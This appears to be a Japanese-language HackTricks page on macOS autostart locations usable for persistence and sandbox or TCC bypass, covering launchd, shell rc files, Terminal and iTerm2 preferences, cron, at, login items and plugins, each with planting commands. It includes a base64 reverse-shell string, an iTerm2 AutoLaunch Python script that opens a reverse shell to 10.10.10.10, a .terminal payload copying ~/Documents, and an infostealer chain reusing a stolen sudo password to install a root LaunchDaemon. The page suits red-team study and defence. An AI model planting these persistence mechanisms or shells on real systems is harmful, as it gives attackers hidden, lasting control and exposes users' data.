# macOS 自動起動

{{#include ../banners/hacktricks-training.md}}

このセクションは、ブログシリーズ [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) に大きく基づいています。目的は、**Autostart Locations** を（可能な限り）追加し、macOS の最新バージョン（13.4）で**現在も機能する technique** と、必要な**permissions**を示すことです。

## Sandbox Bypass

> [!TIP]
> ここでは、**sandbox bypass** に役立つ起動場所を紹介します。これにより、**root permissions** を必要とせず、**file に書き込む**だけで何かを実行し、非常に**common**な**action**、決められた**amount of time**、または sandbox 内から通常実行できる**action**を待つことができます。

### Launchd

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> 興味深い事実として、**`launchd`** には Mach-o section `__Text.__config` に埋め込まれた property list があり、そこには launchd が起動しなければならない、その他のよく知られた services が含まれています。さらに、これらの services には `RequireSuccess`、`RequireRun`、`RebootOnSuccess` を含めることができ、これはそれらが実行され、正常に完了しなければならないことを意味します。
>
> Ofc、code signing のため変更することはできません。

#### Description & Exploitation

**`launchd`** は、起動時に OX S kernel によって実行される**最初の** **process** であり、シャットダウン時に終了する最後の process です。常に **PID 1** である必要があります。この process は、以下にある **ASEP** **plists** に示された設定を**読み取り、実行**します。

- `/Library/LaunchAgents`: admin によってインストールされたユーザーごとの agents
- `/Library/LaunchDaemons`: admin によってインストールされたシステム全体の daemons
- `/System/Library/LaunchAgents`: Apple が提供するユーザーごとの agents。
- `/System/Library/LaunchDaemons`: Apple が提供するシステム全体の daemons。

ユーザーがログインすると、`/Users/$USER/Library/LaunchAgents` および `/Users/$USER/Library/LaunchDemons` にある plists が、**ログインしたユーザーの permissions** で起動します。

**agents と daemons の主な違いは、agents がユーザーのログイン時にロードされ、daemons がシステム起動時にロードされることです**（ssh のように、ユーザーがシステムへアクセスする前に実行する必要がある services が存在するためです）。また、agents は GUI を使用できますが、daemons はバックグラウンドで実行する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
**ユーザーがログインする前に agent を実行する必要がある**ケースがあり、これらは **PreLoginAgents** と呼ばれます。たとえば、ログイン時に支援技術を提供する場合に便利です。これらは `/Library/LaunchAgents` にもあります（例については[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)を参照してください）。

> [!TIP]
> 新しい Daemons または Agents の設定ファイルは、**次回の再起動後、または** `launchctl load <target.plist>` **を使用した後に読み込まれます**。`launchctl -F <file>` を使用すれば、拡張子なしの `.plist` ファイルを読み込むことも**可能です**（ただし、これらの plist ファイルは再起動後に自動的には読み込まれません）。\
> `launchctl unload <target.plist>` を使用して**アンロード**することも**可能です**（そのファイルが指すプロセスは終了します）。
>
> **Agent** または **Daemon** の**実行を妨げる**もの（override など）が**存在しないことを確認するには**、次を実行します：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

現在のユーザーによって読み込まれているすべての agents と daemons を一覧表示します：
```bash
launchctl list
```
#### 悪意のある LaunchDaemon チェーンの例（パスワード再利用）

最近の macOS infostealer は、**取得した sudo パスワード**を再利用して、ユーザーエージェントと root LaunchDaemon を配置しました:<sup>[1]</sup>

- エージェントループを `~/.agent` に書き込み、実行可能にする。
- そのエージェントを指す plist を `/tmp/starter` に生成する。
- 盗んだパスワードを `sudo -S` で再利用し、`/Library/LaunchDaemons/com.finder.helper.plist` にコピーして、`root:wheel` を設定し、`launchctl load` でロードする。
- `nohup ~/.agent >/dev/null 2>&1 &` でエージェントをサイレントに起動し、出力を detach する。
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> plistがユーザーによって所有されている場合、daemonのシステム全体のフォルダ内にあっても、**taskはrootとしてではなくユーザーとして実行されます**。これにより、一部の権限昇格攻撃を防止できます。

#### launchdの詳細情報

**`launchd`**は、**kernel**から起動される最初の**user mode process**です。プロセスの起動は**成功**しなければならず、**終了またはクラッシュすることはできません**。一部の**killing signals**からも**保護**されています。

`launchd`が最初に行うことの1つは、以下のすべての**daemons**を**起動**することです。

- **実行時刻に基づくTimer daemons:**
- atd (`com.apple.atrun.plist`): 30分の`StartInterval`を持つ
- crond (`com.apple.systemstats.daily.plist`): 00:15に起動する`StartCalendarInterval`を持つ
- **Network daemons:**
- `org.cups.cups-lpd`: TCP（`SockType: stream`）で`SockServiceName: printer`を使用してlistenする
- SockServiceNameは、ポートまたは`/etc/services`にあるserviceのいずれかでなければならない
- `com.apple.xscertd.plist`: TCPのポート1640でlistenする
- **指定されたpathが変更されたときに実行されるPath daemons:**
- `com.apple.postfix.master`: path `/etc/postfix/aliases`を確認する
- **IOKit notifications daemons:**
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices`エントリで名前`com.apple.xscertd.helper`を示している
- **UserEventAgent:**
- これは前述のものとは異なります。特定のeventに応答してlaunchdにappsをspawnさせます。ただし、この場合に関与するmain binaryは`launchd`ではなく`/usr/libexec/UserEventAgent`です。SIP restricted folder `/System/Library/UserEventPlugins/`からpluginsをloadします。各pluginは`XPCEventModuleInitializer` keyにinitialiserを指定します。古いpluginsの場合は、その`Info.plist`の`CFPluginFactories` dict内にあるkey `FB86416D-6164-2070-726F-70735C216EC0`で指定します。

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- ただし、これらのfilesをloadするshellを実行するTCC bypassを持つappを見つける必要がある

#### Locations

- **`~/.zshrc`、`~/.zlogin`、`~/.zshenv.zwc`**、**`~/.zshenv`、`~/.zprofile`**
- **Trigger**: zshでterminalを開く
- **`/etc/zshenv`、`/etc/zprofile`、`/etc/zshrc`、`/etc/zlogin`**
- **Trigger**: zshでterminalを開く
- rootが必要
- **`~/.zlogout`**
- **Trigger**: zshでterminalを終了する
- **`/etc/zlogout`**
- **Trigger**: zshでterminalを終了する
- rootが必要
- さらに存在する可能性がある場所: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bashでterminalを開く
- `/etc/profile`（動作しなかった）
- `~/.profile`（動作しなかった）
- `~/.xinitrc`、`~/.xserverrc`、`/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xtermでtriggerされると想定されるが、**インストールされておらず**、インストール後も次のerrorが発生する: xterm: `DISPLAY is not set`<sup>[3]</sup>

#### Description & Exploitation

`zsh`や`bash`などのshell environmentを開始すると、**特定のstartup filesが実行されます**。macOSは現在、default shellとして`/bin/zsh`を使用しています。このshellは、Terminal applicationを起動したとき、またはSSH経由でdeviceにaccessしたときに自動的にaccessされます。macOSには`bash`と`sh`も存在しますが、使用するには明示的にinvokeする必要があります。<sup>[2]</sup>

`man zsh`で読むことができるzshのman pageには、startup filesについての長い説明があります。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 再度開かれる Applications

> [!CAUTION]
> 指定された exploitation の設定を行い、loging-out と loging-in、または reboot しても、私の環境では app を実行できませんでした。（app は実行されていませんでした。これらの操作を行う際に、実行中である必要があるのかもしれません）

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: 再起動時に applications を再度開く

#### Description & Exploitation

再度開く applications はすべて plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[4]</sup> 内にあります。

そのため、再度開かれる applications として自分の app を起動させるには、**自分の app をリストに追加**するだけです。

UUID は、そのディレクトリを一覧表示するか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` で確認できます。

再度開かれる applications を確認するには、次のコマンドを実行します:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**このリストにアプリケーションを追加するには**、次を使用できます:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal は、ユーザーが使用する FDA permissions を持つ

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Terminal を開く

#### Description & Exploitation

**`~/Library/Preferences`** には、Applications におけるユーザーの preferences が保存されています。これらの preferences の一部には、**他の applications/scripts を execute** するための configuration を保持できます。<sup>[5]</sup>

例えば、Terminal は Startup で command を execute できます:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

この config は、**`~/Library/Preferences/com.apple.Terminal.plist`** ファイル内で次のように反映されます:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
つまり、システム内のターミナルの環境設定の plist を上書きできる場合、**`open`** 機能を使用して **ターミナルを開き、そのコマンドを実行させる** ことができます。

これは CLI から次のように追加できます:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / その他のファイル拡張子

- sandbox の bypass に便利: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal を使用して、ユーザーが使用する Terminal に FDA permissions を付与する

#### Location

- **Anywhere**
- **Trigger**: Terminal を開く

#### Description & Exploitation

[**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) を作成して開くと、**Terminal application** が自動的に起動し、その中で指定されたコマンドを実行します。Terminal app に TCC などの特別な権限がある場合、コマンドはその特別な権限で実行されます。

以下で試してください:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
拡張子 **`.command`**、**`.tool`** も使用できます。通常の shell scripts の内容であれば、これらも Terminal で開かれます。

> [!CAUTION]
> Terminal に **Full Disk Access** がある場合、その操作を完了できます（実行された command は terminal window に表示されることに注意してください）。

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 追加の TCC access を取得できる可能性があります

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- root が必要
- **Trigger**: coreaudiod または computer を restart
- **`/Library/Audio/Plug-ins/Components`**
- root が必要
- **Trigger**: coreaudiod または computer を restart
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: coreaudiod または computer を restart
- **`/System/Library/Components`**
- root が必要
- **Trigger**: coreaudiod または computer を restart

#### Description

以前の writeup によると、**一部の audio plugins を compile** して load させることが可能です。<sup>[6][7]</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 追加の TCC access を取得できる可能性があります

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins は、**ファイルの preview を trigger** し（Finder でファイルを選択した状態で space bar を押す）、そのファイル type を support する **plugin** が install されている場合に execute できます。<sup>[8]</sup>

独自の QuickLook plugin を compile し、以前のいずれかの location に配置して load させ、その後 support されているファイルに移動して space を押し、trigger することが可能です。

### ~~Login/Logout Hooks~~

> [!CAUTION]
> user の LoginHook と root の LogoutHook のどちらも、私の環境では動作しませんでした

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` のような command を execute できる必要があります
- `~/Library/Preferences/com.apple.loginwindow.plist` に located

deprecated ですが、user が login したときに commands を execute するために使用できます。<sup>[9]</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
この設定は `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` に保存されます。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
削除するには：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root user のものは **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** に保存されています

## Conditional Sandbox Bypass

> [!TIP]
> ここでは、ファイルに書き込むだけで何かを実行でき、特定の **programs installed**、通常とは異なる **user** の操作、または環境などの、あまり一般的でない条件を想定する **sandbox bypass** に役立つ start locations を紹介します。

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- sandbox bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、`crontab` binary を実行できる必要があります
- または root である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- 直接 write access を得るには root が必要です。`crontab <file>` を実行できる場合は root は不要です
- **Trigger**: cron job に依存します

#### 説明とExploitation

以下を使用して、**current user** の cron jobs を一覧表示します:
```bash
crontab -l
```
ユーザーのすべての cron jobs は **`/usr/lib/cron/tabs/`** および **`/var/at/tabs/`** でも確認できます（root が必要）。

MacOS では、**特定の頻度**でスクリプトを実行するいくつかのフォルダーが次の場所にあります：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
ここでは通常の **cron** **jobs**、**at** **jobs**（あまり使用されない）、および **periodic** **jobs**（主に一時ファイルのクリーニングに使用される）を確認できます。daily periodic jobsは、例えば次のように実行できます: `periodic daily`.<sup>[10]</sup>

**user cronjobをプログラムで追加する**には、次を使用できます:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 は以前、TCC permissions が granted された状態だった

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: iTerm を開く
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: iTerm を開く
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: iTerm を開く

#### Description & Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** に保存された Scripts が実行されます。例:<sup>[11]</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
または:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
スクリプト **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** も実行されます：
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** にある iTerm2 の preferences は、iTerm2 terminal が開かれたときに**実行する command を指定**できます。

この設定は iTerm2 settings で構成できます。

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

そして、その command は preferences に反映されます:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
実行するコマンドは次のように設定できます：
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **iTerm2 preferences**を悪用して任意のコマンドを実行する方法は、ほかにも存在する可能性が非常に高いです。

### xbar

解説: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、xbarがインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility permissionsを要求する

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: xbarが実行されたとき

#### Description

一般的なプログラムである[**xbar**](https://github.com/matryer/xbar)がインストールされている場合、xbarの起動時に実行されるshell scriptを**`~/Library/Application\ Support/xbar/plugins/`**に書き込むことが可能です:<sup>[12]</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、Hammerspoonがインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility permissionsを要求する

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: hammerspoonが実行されると一度

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon)は、**macOS**向けのautomation platformとして機能し、**LUA scripting language**を利用して動作します。特に、完全なAppleScript codeの統合やshell scriptsの実行に対応しており、scripting capabilitiesを大幅に強化します。<sup>[13]</sup>

このアプリは単一のファイル`~/.hammerspoon/init.lua`を探し、起動するとそのscriptが実行されます。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし BetterTouchTool がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts および Accessibility の permissions を要求する

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

この tool を使用すると、特定の shortcut が押されたときに実行する applications または scripts を指定できる。攻撃者は、**データベース内に独自の shortcut と実行する action を設定**し、任意の code を実行させることが可能な場合がある（shortcut は単にキーを押すだけのものでもよい）。

### Alfred

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし Alfred がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation、Accessibility、さらには Full-Disk access の permissions を要求する

#### Location

- `???`

特定の条件が満たされたときに code を実行できる workflows を作成できる。攻撃者が workflow file を作成し、Alfred に load させることが可能な場合がある（workflows を使用するには premium version の購入が必要）。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし ssh が有効化され、使用されている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH は FDA access を使用する

#### Location

- **`~/.ssh/rc`**
- **Trigger**: ssh 経由での Login
- **`/etc/ssh/sshrc`**
- Root が必要
- **Trigger**: ssh 経由での Login

> [!CAUTION]
> ssh を有効にするには Full Disk Access が必要:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

デフォルトでは、`/etc/ssh/sshd_config` に `PermitUserRC no` が設定されていない限り、ユーザーが **SSH 経由で Login** すると、scripts **`/etc/ssh/sshrc`** および **`~/.ssh/rc`** が実行される。<sup>[14]</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし引数付きで `osascript` を実行する必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- `osascript` を呼び出して Exploit payload を保存
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root が必要

#### Description

System Preferences -> Users & Groups -> **Login Items** には、**ユーザーが Login したときに実行される items** が表示される。\
command line から、それらを list、add、remove することが可能:<sup>[15]</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
これらの項目は **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** ファイルに保存されます。

**Login items** は、API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) を使用して指定することもでき、その設定は **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** に保存されます。

### ZIP as Login Item

（Login Items に関する前のセクションを確認してください。これはその拡張です）

**ZIP** ファイルを **Login Item** として保存すると、**`Archive Utility`** がそれを開きます。たとえば、その zip が **`~/Library`** に保存され、バックドアを含む **`LaunchAgents/file.plist`** フォルダーが格納されていた場合、そのフォルダーが作成され（デフォルトでは存在しません）、plist が追加されます。そのため、次回ユーザーが再度ログインしたときに、plist に指定された **バックドアが実行されます**。

別の方法として、ユーザーの HOME 内に **`.bash_profile`** と **`.zshenv`** ファイルを作成することもできます。これにより、LaunchAgents フォルダーがすでに存在する場合でも、この手法は機能します。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし **`at`** を **実行**する必要があり、**有効化されていなければなりません**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** を **実行**する必要があり、**有効化されていなければなりません**

#### **Description**

`at` タスクは、特定の時刻に実行する **1 回限りのタスクをスケジュールする**ために設計されています。cron ジョブとは異なり、`at` タスクは実行後に自動的に削除されます。これらのタスクはシステムの再起動後も保持されるため、特定の条件下では潜在的なセキュリティ上の懸念となる点に注意が必要です。<sup>[16]</sup>

**デフォルト**では**無効**になっていますが、**root** ユーザーは次のコマンドで**有効化**できます。
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
これは1時間後にファイルを作成します:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq:`を使用してジョブキューを確認します。
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上記では、スケジュールされた2つのジョブを確認できます。`at -c JOBNUMBER`を使用して、ジョブの詳細を表示できます。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT tasks が有効化されていない場合、作成された tasks は実行されません。

**job files** は `/private/var/at/jobs/` にあります。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
ファイル名には、queue、job number、実行予定時刻が含まれています。例として `a0001a019bdcd2` を見てみましょう。

- `a` - queue
- `0001a` - hex形式のjob number、`0x1a = 26`
